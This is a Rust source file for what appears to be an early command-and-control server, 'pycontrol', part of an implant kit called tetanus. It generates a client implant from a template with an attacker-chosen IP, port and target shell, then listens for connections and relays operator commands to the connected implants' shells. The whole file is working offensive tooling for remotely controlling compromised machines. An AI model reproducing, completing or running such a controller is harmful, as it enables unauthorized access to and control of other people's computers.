use std::{io::{BufRead}, thread::{self, Thread}, u32, fs::read_to_string};
use std::net::{TcpListener, TcpStream, Shutdown};
use std::io::{Write, BufReader, BufWriter};
use std::process::Command;
use std::fs;

fn help(){
    print!("

Welcome to pyimplant - prototype for tetanus, a rust based implant generation and handeling kit!

Commands:

set ip - set the ip address for the listener
set port - set the port number for the listener NOTE common ports will need sudo privs
generate client - generate the client source code, does not compile yet, that's on the todo
listen - start the listener.  NOTE exit does not gracefully kill the server, just ctrl+c it for now\n")
}


fn handel_client(stream: TcpStream){
    let mut loopize = true;
    while loopize == true {
        println!("loopize = {}", loopize);
        let mut data_buffer = BufReader::new(&stream);
        let mut data_writer = BufWriter::new(&stream);
        let mut response = String::new();
        let mut full_response: Vec<String> = Vec::new();
        let is_blank = false;
        while is_blank == false{
            let mut line: String = String::new();
            data_buffer.read_line(&mut line).expect("Error");
            if line == "END OF BUFFER\n"{
                break;
            }
            else{
                full_response.push(line);
            }
        }
        for line in full_response{
            println!("{}",line);
        }
        println!("response?");
        std::io::stdin().read_line(&mut response).unwrap();
        let response_slice:&str = &response[..]; 
        println!("RESPONSE_SLICE = {}", &response_slice);
        match response_slice{
            "exit\n" =>{
                println!("exit was achieved");
                data_writer.write_all(&mut response_slice.as_bytes()).expect("Failed to write buffer");
                drop(data_writer);
                println!("data_writer dropped");
                stream.shutdown(Shutdown::Both).expect("Error shutting down stream.");
                println!("stream shutdown");
                loopize = false;
                println!("loopize = {}", loopize);
                break;
            },
            "upload file\n" => upload_file(),
            _ => {
                data_writer.write_all(&mut response_slice.as_bytes()).expect("Failed to write buffer");
                drop(data_writer);
            }
        }
    }
    println!("loop exited");
    drop(loopize);
}

fn generat_client(ip: &str,port: &u32 ){
    let mut os = String::new();
    println!("operating system of target?");
    std::io::stdin().read_line(&mut os).unwrap();
    let mut shell = String::new();
    if os.contains("windows"){
        shell = "cmd".to_string();
        println!("windows selected")
    }
    else{
        shell = "sh".to_string();
        println!("Other selected")
    }
    println!("{}", &shell);
    let client_template_string = fs::read_to_string("../pycontrol/src/client_template.txt").expect("error reading file");
    let mut client_template_output = client_template_string.replace("{IP}", ip);
    client_template_output = client_template_output.replace("{PORT}", &format!("{}",port));
    client_template_output = client_template_output.replace("{SHELL}", &format!("{}", shell));
    let mut client = std::fs::File::create("../pyimplantclient/src/main.rs").expect("Error creating file");
    client.write_all(client_template_output.as_bytes()).expect("ERROR WRITING CLIENT RUST FILE");
    println!("Client Generated")
}

fn set_ip() -> String{
    let command_response = Command::new("sh").arg("-c").arg("ip addr").output().unwrap().stdout;
    let stdout_string = match std::str::from_utf8(&command_response){
        Ok(v) => v,
        Err(e) => panic!("Invalid UTF-8 sequence: {}", e)
    };
    let command_lines_split = stdout_string.split("\n");
    let command_lines_vec = command_lines_split.collect::<Vec<&str>>();
    for line in command_lines_vec{
        if line.contains("inet"){
            let ip = line.trim();
            println!("{}", ip);
        } 
    }
    println!("IP address?");
    let mut ip = String::new();
    std::io::stdin().read_line(&mut ip).unwrap();
    return ip.trim_matches('\n').to_string();
}

fn set_port() -> u32{
    println!("Port number?");
    let mut port_string = String::new();
    std::io::stdin().read_line(&mut &mut port_string).unwrap();
    port_string = port_string.trim_matches('\n').to_string();
    let port:u32 = port_string.parse().unwrap();
    println!("{}", port);
    return port;
}


fn upload_file(){
    println!("Not implemented yet!")
}


fn listen(ip: &str, port: &u32){
    let listener = TcpListener::bind(format!("{}:{}", ip, port)).unwrap();
    for stream in listener.incoming(){
        match stream {
            Ok(stream) => {
                println!("New connection: {}", stream.peer_addr().unwrap());
                let client_thread = thread::spawn(move|| {
                    // connection succeeded
                    handel_client(stream)
                });
                println!("client thread closed");
                client_thread.join().unwrap();
            }
            Err(e) => {
                println!("Error: {}", e);
                // connection failed
            }
        }
    }
}


fn main(){
    println!("Welcome to Pycontrol");
    let mut ip = String::new();
    let mut port: u32 = 0;
    let command_loop = true;
    while command_loop{
        print!("Command?\n");
        let mut pycommand = String::new();
        std::io::stdin().read_line(&mut pycommand).unwrap();
        let pycommand_slice: &str = &pycommand[..];
        match pycommand_slice{
            "exit\n" => break,
            "help\n" => help(),
            "set ip\n" => ip = set_ip(),
            "set port\n" => port = set_port(),
            "listen\n" => listen(&ip, &port),
            "generate client\n" => generat_client(&ip, &port),
            &_ => println!("Unknown Command, please type help for help.")
        };
    } 
}
